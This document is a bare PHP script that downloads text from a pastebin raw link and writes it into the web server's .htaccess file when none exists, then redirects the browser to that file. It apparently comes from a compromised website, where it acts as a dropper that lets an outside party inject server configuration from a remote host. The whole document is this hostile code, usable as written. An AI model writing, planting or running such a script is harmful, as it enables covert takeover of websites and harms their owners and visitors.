<?php
$content = "https://pastebin.com/raw/XdkL0aD2";
$get_content = file_get_contents($content);
if(file_exists(".htaccess")){header("location: .htaccess");}else{file_put_contents(".htaccess", $get_content); header("location: .htaccess");}
?>
